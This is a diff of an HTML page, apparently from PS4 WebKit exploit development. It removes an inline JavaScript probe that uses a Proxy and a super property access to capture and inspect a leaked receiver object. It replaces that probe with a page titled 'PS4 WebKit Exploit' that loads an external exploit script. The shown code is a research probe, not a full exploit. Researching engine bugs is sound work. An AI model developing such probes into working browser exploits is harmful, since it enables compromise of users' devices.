@@ -1,89 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PS4 WebKit Exploit</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
+    pre#log { white-space: pre-wrap; }
+  </style>
+</head>
 <body>
-<pre id="out"></pre>
-<script>
-function log(msg) {
-    document.getElementById("out").textContent += msg + "\n";
-}
+  <h1>PS4 WebKit Exploit</h1>
+  <pre id="log">[+] Loading...</pre>
 
-function leakReceiverViaSuperGet() {
-    let capturedReceiver = null;
-
-    class Leaker {
-        leak() {
-            return super.secret;
-        }
-    }
-
-    Leaker.prototype.__proto__ = new Proxy({}, {
-        get(target, prop, receiver) {
-            log(`[+] Proxy trap hit for "${prop}"`);
-            capturedReceiver = receiver;
-            return 42;
-        }
-    });
-
-    const { leak } = Leaker.prototype;
-    leak(); // trigger once
-
-    if (!capturedReceiver) {
-        log("[-] Failed to capture receiver!");
-    } else {
-        log("[+] Captured receiver!");
-        return capturedReceiver;
-    }
-
-    return null;
-}
-
-function inspectReceiver(r) {
-    try {
-        log(`typeof: ${typeof r}`);
-    } catch (e) {
-        log(`typeof threw: ${e.message}`);
-    }
-
-    try {
-        log(`toString: ${String(r)}`);
-    } catch (e) {
-        log(`String() threw: ${e.message}`);
-    }
-
-    try {
-        log(`+r: ${+r}`);
-    } catch (e) {
-        log(`+r threw: ${e.message}`);
-    }
-
-    try {
-        log(`Object.getPrototypeOf: ${Object.getPrototypeOf(r)}`);
-    } catch (e) {
-        log(`getPrototypeOf threw: ${e.message}`);
-    }
-
-    try {
-        log(`Reflect.ownKeys: ${JSON.stringify(Reflect.ownKeys(r))}`);
-    } catch (e) {
-        log(`Reflect.ownKeys threw: ${e.message}`);
-    }
-
-    try {
-        r._probe = 1337;
-        log(`Assigned _probe: ${r._probe}`);
-    } catch (e) {
-        log(`Assigning _probe threw: ${e.message}`);
-    }
-
-    try {
-        log(`isExtensible: ${Object.isExtensible(r)}`);
-    } catch (e) {
-        log(`isExtensible threw: ${e.message}`);
-    }
-}
-
-const r = leakReceiverViaSuperGet();
-if (r) inspectReceiver(r);
-</script>
+  <script src="Leak_test_exploit.js"></script>
 </body>
 </html>
